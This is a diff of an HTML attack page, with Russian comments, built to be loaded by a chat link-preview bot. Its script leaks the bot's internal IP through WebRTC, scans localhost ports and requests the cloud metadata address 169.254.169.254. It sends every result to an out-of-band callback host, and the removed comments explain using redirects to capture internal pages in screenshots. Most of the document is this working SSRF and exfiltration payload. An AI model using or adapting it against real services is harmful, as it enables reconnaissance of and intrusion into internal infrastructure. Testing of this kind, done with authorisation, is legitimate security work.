@@ -1,35 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head><title>Data Exfiltration</title></head>
+<head>
+    <meta charset="UTF-8">
+    <link rel="dns-prefetch" href="http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun">
+    <link rel="preconnect" href="http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun">
+</head>
 <body>
-<script>
-    const oast = "http://esqbwjbyepcxrsacleqflghezhfek89a4.oast.fun";
+    <script>
+        const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
 
-    // 1. Утечка внутреннего IP через WebRTC (Классика)
-    try {
-        var pc = new RTCPeerConnection({iceServers:[]});
-        pc.createDataChannel("");
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (ice) => {
-            if (ice && ice.candidate && ice.candidate.candidate) {
-                var internalIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-                fetch(`${oast}/webrtc_leak_${internalIP}`);
-            }
-        };
-    } catch(e) { fetch(`${oast}/webrtc_failed`); }
+        // Функция-пуля: максимально быстрая отправка
+        function send(path) {
+            var n = new Image();
+            n.src = oast + "/" + path + "?r=" + Math.random();
+        }
 
-    // 2. Утечка характеристик системы
-    const info = btoa(`UA: ${navigator.userAgent}, Plat: ${navigator.platform}`);
-    fetch(`${oast}/sys_info?data=${info}`);
+        // 1. Сразу шлем сигнал, что JS стартанул
+        send("JS_START_SUCCESS");
 
-    // 3. ТРЮК ДЛЯ ПРЕВЬЮ (Чтобы увидеть "инфу" глазами в чате MAX)
-    // Мы ждем 2 секунды, чтобы скрипты выше отработали, 
-    // а затем редиректим бота на внутренний ресурс. 
-    // Бот сделает скриншот этого ресурса и покажет его ТЕБЕ в чате VK.
-    setTimeout(() => {
-        window.location.href = "http://169.254.169.254/latest/meta-data/hostname"; 
-        // или http://127.0.0.1/server-status
-    }, 2500);
-</script>
+        // 2. Пытаемся вытянуть внутренний IP (WebRTC) - очень быстро
+        try {
+            var pc = new RTCPeerConnection({iceServers:[]});
+            pc.createDataChannel("");
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = (e) => {
+                if (e && e.candidate) {
+                    var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
+                    send("IP_LEAK_" + ip);
+                }
+            };
+        } catch(err) { send("WEBRTC_ERROR"); }
+
+        // 3. Сканим порты через фоновые картинки (без fetch!)
+        const ports = [80, 8080, 3000, 9000];
+        ports.forEach(p => {
+            var img = new Image();
+            img.src = "http://127.0.0.1:" + p + "/favicon.ico";
+            img.onerror = () => send("PORT_HIT_" + p);
+        });
+
+        // 4. ГЛАВНЫЙ ТРЮК: Редирект в самом конце, чтобы бот не закрылся раньше времени
+        setTimeout(() => {
+            window.location.href = oast + "/FINAL_REDIRECT";
+        }, 1500);
+    </script>
+
+    <img src="http://169.254.169.254/latest/meta-data/hostname" onerror="this.src='http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/METADATA_TRIGGERED'">
 </body>
 </html>
